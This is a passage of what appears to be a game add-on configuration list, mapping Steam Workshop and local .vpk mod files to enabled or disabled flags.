	""workshop\2870049497.vpk""		""0""
	""workshop\2951021761.vpk""		""0""
	""workshop\2959768051.vpk""		""0""
	""workshop\3021150097.vpk""		""0""
	""workshop\3018311204.vpk""		""0""
	""br800_noworkshop.vpk""		""1""
	""workshop\377648425.vpk""		""0""
	""workshop\295453946.vpk""		""0""
	""workshop\409057094.vpk""		""0""
	""workshop\121094109.vpk""		""0""
	""workshop\287940987.vpk""		""0""
	""workshop\2847761029.vpk""		""0""
	""workshop\2889004625.vpk""		""0""
	""workshop\2889006119.vpk""		""0""
	""workshop\2170681389.vpk""		""0""
	""workshop\2965823450.vpk""		""0""
	""workshop\2838738050.vpk""		""0""
	""workshop\591861666.vpk""		""0""
	""workshop\1668256191.vpk""		""0""
	""workshop\2090436652.vpk""		""0""
	""workshop\2368545870.vpk""		""0""
	""workshop\2505406624.vpk""		""0""
	""workshop\2647248578.vpk""		""0""
	""workshop\2647300607.vpk""		""0""
	""workshop\2778742681.vpk""		""0""
	""workshop\2800219768.vpk""		""0""
	""workshop\3025859925.vpk""		""0""
	""workshop\2668272749.vpk""		""0""
	""workshop\1500251474.vpk""		""0""
	""workshop\1933965608.vpk""		""0""
	""workshop\2960578875.vpk""		""0""
	""workshop\2960579535.vpk""		""0""
	""workshop\2263678651.vpk""		""0""
	""workshop\2814356044.vpk""		""0""
	""workshop\2920239282.vpk""		""0""
	""workshop\3022899921.vpk""		""0""
	""workshop\3042240557.vpk""		""0""
	""workshop\1568034608.vpk""		""0""
	""workshop\1664029628.vpk""		""0""
	""workshop\3049320850.vpk""		""0""
	""workshop\374876411.vpk""		""0""
	""workshop\2904218076.vpk""		""0""
	""workshop\2955832703.vpk""		""0""
	""workshop\3054282885.vpk""		""0""
	""workshop\406659092.vpk""		""0""
	""workshop\2935960532.vpk""		""0""
	""workshop\1818543708.vpk""		""0""
	""workshop\892842954.vpk""		""0""
	""workshop\2891462372.vpk""		""0""
	""workshop\3129972732.vpk""		""0""
	""workshop\3144345919.vpk""		""0""
	""workshop\3144347291.vpk""		""0""
	""workshop\3144349229.vpk""		""0""
	""workshop\403040832.vpk""		""0""
	""workshop\2521797406.vpk""		""0""
	""ftac_recon_laser.vpk""		""1""
	""magma_spitter_noskin.vpk""		""1""
	""workshop\2592839839.vpk""		""1""
	""workshop\3040222522.vpk""		""1""
	""workshop\2291140471.vpk""		""1""
	""workshop\2236303591.vpk""		""1""
	""workshop\2860110631.vpk""		""1""
	""workshop\2904744563.vpk""		""1""
	""workshop\2942279048.vpk""		""1""
	""workshop\2944554307.vpk""		""1""
	""workshop\3029465086.vpk""		""1""
	""workshop\3050799865.vpk""		""1""
	""workshop\3042954650.vpk""		""1""
	""workshop\2976446435.vpk""		""1""
	""workshop\3030690003.vpk""		""1""
	""workshop\2951220517.vpk""		""1""
	""workshop\2959544300.vpk""		""1""
	""workshop\3027174578.vpk""		""1""
	""workshop\2536545111.vpk""		""1""
	""workshop\2516490922.vpk""		""1""
	""workshop\2843349729.vpk""		""1""
	""workshop\2923605019.vpk""		""1""
	""workshop\2927087770.vpk""		""1""
	""workshop\2995681316.vpk""		""1""
	""workshop\2600813144.vpk""		""1""
	""workshop\2470086874.vpk""		""1""
	""workshop\3004090556.vpk""		""1""
	""workshop\3000339296.vpk""		""1""
	""workshop\443211769.vpk""		""1""
	""workshop\249705956.vpk""		""1""
	""workshop\239828519.vpk""		""1""
	""workshop\450256600.vpk""		""1""
	""workshop\459213712.vpk""		""1""
	""workshop\459440352.vpk""		""1""
	""workshop\491176342.vpk""		""1""
	""workshop\366796179.vpk""		""1""
	""workshop\270638990.vpk""		""1""
	""workshop\130033528.vpk""		""1""
	""workshop\617218968.vpk""		""1""
	""workshop\529551292.vpk""		""1""
	""workshop\501832751.vpk""		""1""
	""workshop\348458236.vpk""		""1""
	""workshop\122028722.vpk""		""1""
	""workshop\127192234.vpk""		""1""
	""workshop\127164671.vpk""		""1""
	""workshop\204936283.vpk""		""1""
	""workshop\204935746.vpk""		""1""
	""workshop\414025630.vpk""		""1""
	""workshop\322261281.vpk""		""1""
	""workshop\231911415.vpk""		""1""
	""workshop\408659676.vpk""		""1""
	""workshop\404570956.vpk""		""1""
	""workshop\406474238.vpk""		""1""
	""workshop\399205947.vpk""		""1""
	""workshop\395199376.vpk""		""1""
	""workshop\149935807.vpk""		""1""
	""workshop\306296503.vpk""		""1""
	""workshop\122422880.vpk""		""1""
	""workshop\240395092.vpk""		""1""
	""workshop\223386120.vpk""		""1""
	""workshop\238361899.vpk""		""1""
	""workshop\239373009.vpk""		""1""
	""workshop\140053787.vpk""		""1""
	""workshop\285662486.vpk""		""1""
	""workshop\380429423.vpk""		""1""
	""workshop\127193408.vpk""		""1""
	""workshop\127198293.vpk""		""1""
	""workshop\127191089.vpk""		""1""
	""workshop\121725116.vpk""		""1""
	""workshop\305030125.vpk""		""1""
	""workshop\235605374.vpk""		""1""
	""workshop\205941159.vpk""		""1""
	""workshop\139883646.vpk""		""1""
	""workshop\203915750.vpk""		""1""
	""workshop\139560891.vpk""		""1""
	""workshop\130932369.vpk""		""1""
	""workshop\319203236.vpk""		""1""
	""workshop\215993741.vpk""		""1""
	""workshop\134796125.vpk""		""1""
	""workshop\133761709.vpk""		""1""
	""workshop\127167490.vpk""		""1""
	""workshop\334453410.vpk""		""1""
	""workshop\259659492.vpk""		""1""
	""workshop\258473193.vpk""		""1""
	""workshop\217440430.vpk""		""1""
	""workshop\2807505658.vpk""		""1""
	""workshop\2860203837.vpk""		""1""
	""workshop\469833631.vpk""		""1""
	""workshop\937142418.vpk""		""1""
	""workshop\1883037436.vpk""		""1""
	""workshop\2078265669.vpk""		""1""
	""workshop\2276357614.vpk""		""1""
	""workshop\2277402070.vpk""		""1""
	""workshop\2357193737.vpk""		""1""
	""workshop\2684105741.vpk""		""1""
	""workshop\2708770665.vpk""		""1""
	""workshop\2749584063.vpk""		""1""
	""workshop\2860160990.vpk""		""1""
	""workshop\2862032979.vpk""		""1""
	""workshop\2868356174.vpk""		""1""
	""workshop\2871317159.vpk""		""1""
	""workshop\2889004247.vpk""		""1""
	""workshop\2889007637.vpk""		""1""
	""workshop\2889890981.vpk""		""1""
	""workshop\2892224388.vpk""		""1""
	""workshop\2289317307.vpk""		""1""
	""workshop\2852406112.vpk""		""1""
	""workshop\2894796521.vpk""		""1""
	""workshop\273115576.vpk""		""1""
	""workshop\2848316602.vpk""		""1""
	""workshop\2608463815.vpk""		""1""
	""workshop\2857186367.vpk""		""1""
	""workshop\2623122997.vpk""		""1""
	""workshop\957012745.vpk""		""1""
	""workshop\3018209162.vpk""		""1""
	""workshop\3019812866.vpk""		""1""
	""workshop\3022393188.vpk""		""1""
	""workshop\164497631.vpk""		""1""
	""workshop\261993789.vpk""		""1""
	""workshop\312530007.vpk""		""1""
	""workshop\463412264.vpk""		""1""
	""workshop\465137676.vpk""		""1""
	""workshop\487887891.vpk""		""1""
	""workshop\493881220.vpk""		""1""
	""workshop\497883394.vpk""		""1""
	""workshop\552512746.vpk""		""1""
	""workshop\657115231.vpk""		""1""
	""workshop\710194284.vpk""		""1""
	""workshop\2193880197.vpk""		""1""
	""workshop\2395887017.vpk""		""1""
	""workshop\2650051986.vpk""		""1""
	""workshop\2898905627.vpk""		""1""
	""workshop\2973295289.vpk""		""1""
}
"
